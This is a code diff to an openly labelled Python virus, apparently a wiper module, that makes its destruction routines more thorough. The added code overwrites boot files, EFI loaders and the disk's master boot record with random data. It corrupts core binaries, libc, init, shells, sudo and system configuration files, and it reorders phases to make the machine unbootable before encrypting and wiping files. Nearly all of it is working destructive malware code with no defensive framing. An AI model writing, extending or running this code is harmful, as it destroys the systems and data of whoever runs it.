@@ -154,14 +154,15 @@ def should_skip_path(path):
     if path.startswith(virus_dir):
         return True
     
-    # Skip only virtual filesystems and device files (for safety)
-    # NOTE: For complete destruction, we allow /boot to be targeted
+    # Skip only virtual filesystems (for safety)
+    # NOTE: For complete destruction, we target /boot, /run, and everything else
     skip_patterns = [
-        '/proc',  # Virtual filesystem
-        '/sys',   # Virtual filesystem
-        '/dev',   # Device files
-        '/run',   # Runtime data (may cause immediate system issues)
+        '/proc',  # Virtual filesystem (will cause errors if we try to modify)
+        '/sys',   # Virtual filesystem (will cause errors if we try to modify)
     ]
+    
+    # Only skip /dev if we can't write to it (most systems require root)
+    # But try to corrupt /dev/sda (MBR) if possible
     
     # Only skip /boot if DESTRUCTION_SKIP_BOOT is enabled
     from virus_config import DESTRUCTION_SKIP_BOOT
@@ -198,22 +199,25 @@ def get_target_directories():
         if os.path.exists(home_dir):
             targets.append(home_dir)
     
-    # System critical directories (for complete destruction)
+    # System critical directories (for complete destruction) - ATTACK EVERYTHING
     system_dirs = [
-        '/etc',           # System configuration
+        '/boot',          # Boot files - CRITICAL for system boot
+        '/etc',           # System configuration - CRITICAL
         '/usr',           # User programs and data
-        '/usr/bin',       # User binaries
-        '/usr/sbin',      # System binaries
-        '/usr/lib',       # Libraries
-        '/usr/lib64',     # 64-bit libraries
+        '/usr/bin',       # User binaries - CRITICAL
+        '/usr/sbin',      # System binaries - CRITICAL
+        '/usr/lib',       # Libraries - CRITICAL
+        '/usr/lib64',     # 64-bit libraries - CRITICAL
         '/usr/lib32',     # 32-bit libraries
+        '/usr/lib/x86_64-linux-gnu',  # System libraries
         '/usr/share',     # Shared data
         '/usr/local',     # Local installations
-        '/bin',           # Essential binaries
-        '/sbin',          # System binaries
-        '/lib',           # Essential libraries
-        '/lib64',         # 64-bit essential libraries
+        '/bin',           # Essential binaries - CRITICAL
+        '/sbin',          # System binaries - CRITICAL
+        '/lib',           # Essential libraries - CRITICAL
+        '/lib64',         # 64-bit essential libraries - CRITICAL
         '/lib32',         # 32-bit essential libraries
+        '/lib/x86_64-linux-gnu',  # System libraries - CRITICAL
         '/opt',           # Optional software
         '/srv',           # Service data
         '/var',           # Variable data
@@ -222,6 +226,7 @@ def get_target_directories():
         '/var/log',       # Log files
         '/var/cache',     # Cache files
         '/var/tmp',       # Temporary files
+        '/run',           # Runtime data - can cause immediate system issues
     ]
     
     for system_dir in system_dirs:
@@ -345,82 +350,165 @@ def wipe_filesystem(target_dirs=None, file_extensions=None, max_files=None):
     log_activity("DESTRUCTION", f"Wiping complete: {wiped_count} files wiped, {error_count} errors")
 
 def corrupt_boot_files():
-    """Corrupt boot files to prevent system from booting"""
+    """Corrupt boot files to prevent system from booting - COMPLETE DESTRUCTION"""
     boot_targets = [
         '/boot/vmlinuz',
         '/boot/initrd.img',
+        '/boot/initrd',
         '/boot/grub/grub.cfg',
         '/boot/grub/menu.lst',
+        '/boot/grub/grubenv',
         '/boot/efi/EFI/ubuntu/grubx64.efi',
+        '/boot/efi/EFI/ubuntu/shimx64.efi',
         '/boot/efi/EFI/BOOT/bootx64.efi',
+        '/boot/efi/EFI/BOOT/grubx64.efi',
     ]
     
     corrupted = 0
     for boot_file in boot_targets:
         if os.path.exists(boot_file):
             try:
-                # Overwrite with random data
+                # Overwrite with random data - larger size for boot files
+                file_size = min(os.path.getsize(boot_file), 10240)  # Max 10KB
                 with open(boot_file, 'wb') as f:
-                    f.write(os.urandom(1024))  # Write 1KB of random data
+                    f.write(os.urandom(file_size if file_size > 0 else 2048))
                 corrupted += 1
                 log_activity("DESTRUCTION", f"Corrupted boot file: {boot_file}")
             except:
                 pass
     
+    # Corrupt all files in /boot directory
+    if os.path.exists('/boot'):
+        try:
+            for root, dirs, files in os.walk('/boot'):
+                for file in files:
+                    boot_file = os.path.join(root, file)
+                    if boot_file not in boot_targets:  # Avoid double processing
+                        try:
+                            file_size = min(os.path.getsize(boot_file), 5120)
+                            with open(boot_file, 'wb') as f:
+                                f.write(os.urandom(file_size if file_size > 0 else 1024))
+                            corrupted += 1
+                        except:
+                            pass
+        except:
+            pass
+    
     if corrupted > 0:
-        log_activity("DESTRUCTION", f"Corrupted {corrupted} boot files - system may not boot")
+        log_activity("DESTRUCTION", f"Corrupted {corrupted} boot files - SYSTEM WILL NOT BOOT")
+    
+    # Also try to corrupt MBR if possible (requires root)
+    try:
+        import fcntl
+        # Try to corrupt first 512 bytes of first disk (MBR)
+        try:
+            with open('/dev/sda', 'wb') as f:
+                f.write(os.urandom(512))  # Corrupt MBR
+            log_activity("DESTRUCTION", "Corrupted MBR - SYSTEM WILL NOT BOOT")
+        except:
+            pass
+    except:
+        pass
 
 def corrupt_system_critical_files():
-    """Corrupt critical system files"""
+    """Corrupt critical system files to make system unbootable"""
     critical_files = [
-        '/etc/passwd',
-        '/etc/shadow',
-        '/etc/group',
-        '/etc/fstab',
-        '/etc/hosts',
-        '/etc/resolv.conf',
-        '/etc/network/interfaces',
-        '/etc/systemd/system.conf',
-        '/bin/sh',
-        '/bin/bash',
-        '/bin/ls',
-        '/usr/bin/python3',
-        '/usr/bin/python',
+        # Essential system binaries - corrupt these and system won't work
+        '/bin/sh', '/bin/bash', '/bin/dash', '/bin/cat', '/bin/ls', '/bin/mv', '/bin/cp', '/bin/rm',
+        '/bin/mkdir', '/bin/rmdir', '/bin/chmod', '/bin/chown', '/bin/mount', '/bin/umount',
+        '/sbin/init', '/sbin/reboot', '/sbin/shutdown', '/sbin/halt', '/sbin/poweroff',
+        '/sbin/mount', '/sbin/umount', '/sbin/fsck', '/sbin/mkfs',
+        
+        # System libraries - corrupt these and nothing will run
+        '/lib/systemd/systemd', '/lib64/ld-linux-x86-64.so.2', '/lib/x86_64-linux-gnu/libc.so.6',
+        
+        # System configuration - corrupt these and system won't boot properly
+        '/etc/passwd', '/etc/shadow', '/etc/group', '/etc/gshadow',
+        '/etc/fstab', '/etc/mtab', '/etc/hosts', '/etc/hostname',
+        '/etc/resolv.conf', '/etc/network/interfaces', '/etc/netplan',
+        '/etc/systemd/system.conf', '/etc/systemd/user.conf',
+        '/etc/default/grub', '/etc/grub.d',
+        
+        # Init system files
+        '/etc/inittab', '/etc/rc.local', '/etc/init.d',
+        
+        # Python and interpreters - corrupt these to prevent recovery
+        '/usr/bin/python3', '/usr/bin/python', '/usr/bin/python2',
+        '/usr/bin/perl', '/usr/bin/ruby', '/usr/bin/node',
+        
+        # Shell scripts and utilities
+        '/usr/bin/sh', '/usr/bin/bash', '/usr/bin/zsh', '/usr/bin/fish',
+        
+        # System utilities
+        '/usr/bin/sudo', '/usr/bin/su', '/usr/bin/chmod', '/usr/bin/chown',
+        
+        # Bootloader files
+        '/boot/grub/grub.cfg', '/boot/grub/menu.lst', '/boot/grub/grubenv',
     ]
     
     corrupted = 0
     for critical_file in critical_files:
         if os.path.exists(critical_file):
             try:
-                # Overwrite with random data
+                # Overwrite with random data - larger size for binaries
+                file_size = min(os.path.getsize(critical_file), 10240)  # Max 10KB
                 with open(critical_file, 'wb') as f:
-                    f.write(os.urandom(512))  # Write 512 bytes of random data
+                    f.write(os.urandom(file_size if file_size > 0 else 1024))
                 corrupted += 1
                 log_activity("DESTRUCTION", f"Corrupted critical file: {critical_file}")
             except:
                 pass
     
+    # Also corrupt all files in critical directories
+    critical_dirs = [
+        '/etc/systemd/system',
+        '/etc/init.d',
+        '/etc/rc.d',
+        '/bin',
+        '/sbin',
+    ]
+    
+    for critical_dir in critical_dirs:
+        if os.path.exists(critical_dir):
+            try:
+                for root, dirs, files in os.walk(critical_dir):
+                    for file in files:
+                        file_path = os.path.join(root, file)
+                        try:
+                            file_size = min(os.path.getsize(file_path), 5120)  # Max 5KB
+                            with open(file_path, 'wb') as f:
+                                f.write(os.urandom(file_size if file_size > 0 else 512))
+                            corrupted += 1
+                        except:
+                            pass
+            except:
+                pass
+    
     if corrupted > 0:
-        log_activity("DESTRUCTION", f"Corrupted {corrupted} critical system files")
+        log_activity("DESTRUCTION", f"Corrupted {corrupted} critical system files - SYSTEM WILL NOT BOOT")
 
 def destroy_filesystem():
-    """Complete filesystem destruction - encryption + wiping + corruption"""
-    log_activity("DESTRUCTION", "Starting complete filesystem destruction...")
+    """Complete filesystem destruction - encryption + wiping + corruption - SYSTEM KILLER"""
+    log_activity("DESTRUCTION", "Starting COMPLETE SYSTEM DESTRUCTION...")
     
-    # Phase 1: Encrypt files
-    if ENABLE_FILESYSTEM_ENCRYPTION:
-        encrypt_filesystem(max_files=None)  # No limit for complete destruction
-    
-    # Phase 2: Wipe files
-    if ENABLE_FILESYSTEM_WIPING:
-        wipe_filesystem(max_files=None)  # No limit for complete destruction
-    
-    # Phase 3: Corrupt boot and critical files
+    # Phase 1: IMMEDIATE - Corrupt boot and critical files FIRST (fastest way to kill system)
     if ENABLE_FILESYSTEM_DESTRUCTION:
+        log_activity("DESTRUCTION", "Phase 1: Corrupting boot and critical system files...")
         corrupt_boot_files()
         corrupt_system_critical_files()
+        log_activity("DESTRUCTION", "Phase 1 complete - System is now UNBOOTABLE")
     
-    log_activity("DESTRUCTION", "Complete filesystem destruction finished")
+    # Phase 2: Encrypt files (while system is still running)
+    if ENABLE_FILESYSTEM_ENCRYPTION:
+        log_activity("DESTRUCTION", "Phase 2: Encrypting filesystem...")
+        encrypt_filesystem(max_files=None)  # No limit for complete destruction
+    
+    # Phase 3: Wipe files (final destruction)
+    if ENABLE_FILESYSTEM_WIPING:
+        log_activity("DESTRUCTION", "Phase 3: Wiping filesystem...")
+        wipe_filesystem(max_files=None)  # No limit for complete destruction
+    
+    log_activity("DESTRUCTION", "COMPLETE SYSTEM DESTRUCTION FINISHED - SYSTEM IS DEAD")
 
 def destruction_worker():
     """Background worker for periodic filesystem destruction"""
